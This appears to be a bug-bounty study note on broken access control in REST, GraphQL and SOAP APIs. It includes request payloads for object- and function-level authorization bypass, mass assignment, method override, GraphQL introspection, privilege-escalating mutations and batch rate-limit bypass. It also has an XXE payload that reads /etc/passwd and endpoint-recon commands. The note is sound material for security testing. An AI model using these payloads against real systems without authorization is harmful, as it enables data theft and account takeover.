---
tags: [bac, theory, api, graphql, rest, bola, bfla]
type: theory
severity: critical
owasp_ref: "A01:2021"
date: 2026-03-10
---

# 🔌 API Broken Access Control — REST, GraphQL, SOAP

## API-Specific Threat Landscape

APIs expose access control failures differently than traditional web apps. OWASP API Security Top 10 dedicates two entries specifically:
- **API1: BOLA** (Broken Object Level Authorization) = IDOR for APIs
- **API5: BFLA** (Broken Function Level Authorization) = Vertical privesc for APIs

---

## 🔴 REST API Attack Patterns

### BOLA — Broken Object Level Authorization
```http
# User owns order 1001
GET /api/v1/orders/1001     → 200 ✅
# Access another user's order
GET /api/v1/orders/1002     → 200 ❌ (BOLA!)
GET /api/v1/orders/1002     → 403 ✅ (Correct)

# Also check nested resources:
GET /api/v1/users/9999/addresses
GET /api/v1/users/9999/payment-methods
GET /api/v1/users/9999/messages
```

### BFLA — Broken Function Level Authorization
```http
# Admin-only functions accessible to regular users:
DELETE /api/v1/admin/users/9999
PUT /api/v1/admin/config/ratelimit
GET /api/v1/admin/audit-logs
POST /api/v1/admin/broadcast-message

# Also hidden in non-obvious locations:
POST /api/v1/users/me/promote-to-admin   ← unusual but exists
GET /api/v1/internal/metrics
```

### Version-Based Bypass
```http
# New API version enforces auth:
GET /api/v2/users/1337        → 403
# Old version still works:
GET /api/v1/users/1337        → 200 ✅ (unpatched!)
GET /api/users/1337           → 200 ✅ (no version = old behavior)
```

### Mass Assignment in REST
```http
PATCH /api/v1/users/me
Content-Type: application/json

{"displayName": "hacker"}           ← intended
{"displayName": "hacker", "role": "admin"}  ← mass assignment test
{"displayName": "hacker", "isAdmin": true}
{"displayName": "hacker", "credits": 99999}
{"displayName": "hacker", "verified": true}
```

### HTTP Method Manipulation
```http
# Only POST is protected, GET isn't
GET  /api/v1/delete-user?id=9999    → executes delete!
HEAD /api/v1/admin/export           → may work if only POST blocked

# Override headers
POST /api/v1/admin/action
X-HTTP-Method-Override: GET
X-Method-Override: GET
_method=GET
```

---

## 🟣 GraphQL Attack Patterns

### Introspection — Map Everything
```graphql
# Always try this first even if "disabled"
query {
  __schema {
    types { name fields { name type { name } } }
  }
}

# If introspection is blocked, try:
query { __type(name:"User") { fields { name } } }

# Clairvoyance tool for blind introspection:
# python3 clairvoyance.py -u https://target.com/graphql
```

### BOLA via GraphQL Arguments
```graphql
# Normal: fetch your own user
query { user(id: "me") { email phone ssn } }

# IDOR: fetch another user
query { user(id: "usr_1338") { email phone ssn } }
query { user(id: 1338) { email phone ssn } }
```

### Field-Level Authorization Bypass
```graphql
# Even if the object is accessible, some fields may be over-exposed
query {
  users {
    id
    email        # expected
    passwordHash  # should be hidden!
    apiKey       # should be hidden!
    creditCard { number cvv }  # critical!
  }
}
```

### GraphQL Mutation Privilege Escalation
```graphql
mutation {
  updateUser(id: "usr_1338", input: {
    email: "hacker@evil.com"
    role: ADMIN
    isVerified: true
  }) {
    id email role
  }
}
```

### Batch Query Abuse (Rate Limit Bypass)
```graphql
# Send 100 queries in one request to bypass rate limiting
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  ...
  {"query": "query { user(id: 100) { email } }"}
]
```

### Subscription Access Control
```graphql
# Subscribe to another user's events
subscription {
  messageReceived(userId: "victim_usr_id") {
    content sender timestamp
  }
}
```

---

## 🔵 SOAP / XML-Based API Patterns

```xml
<!-- Change userId in SOAP body -->
<soapenv:Body>
  <getUserData>
    <userId>1337</userId>  ← change to 1338
  </getUserData>
</soapenv:Body>

<!-- XXE for file access (when combined with BAC bypass) -->
<userId>
  <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  &xxe;
</userId>
```

---

## 🔍 API Recon Techniques

```bash
# Find API endpoints from JS files
grep -Eo '(api|v[0-9])/[a-zA-Z0-9/_-]+' *.js | sort -u

# Swagger/OpenAPI discovery
curl https://target.com/swagger.json
curl https://target.com/openapi.json
curl https://target.com/api-docs
curl https://target.com/api/swagger
curl https://target.com/v1/swagger.json

# GraphQL endpoint discovery
/graphql
/graphiql
/api/graphql
/v1/graphql
/query

# Postman collection leaks (Google dork)
site:postman.com "target.com"

# GitHub recon for API routes
site:github.com "target.com" "api/v"
```

---

## Hunting Tasks
- [ ] #task Run introspection on all GraphQL endpoints
- [ ] #task Find all API versions (v1, v2, v3, beta, internal)
- [ ] #task Test BOLA on every object ID in every endpoint
- [ ] #task Test BFLA: try all admin functions from regular user
- [ ] #task Test mass assignment on all POST/PUT/PATCH endpoints
- [ ] #task Check Swagger/OpenAPI docs for undocumented fields
- [ ] #task Look for Postman collections in GitHub/Google
- [ ] #task Test batch query abuse on GraphQL
- [ ] #task Test subscriptions for unauthorized data streams
- [ ] #task Check older API versions for unpatched BAC

---

## 🔗 Related Notes
- [[IDOR]]
- [[Mass-Assignment]]
- [[Burp-Suite-BAC]]
- [[Nuclei-BAC]]

---
*Tags: #api #bac #graphql #rest #bola #bfla*
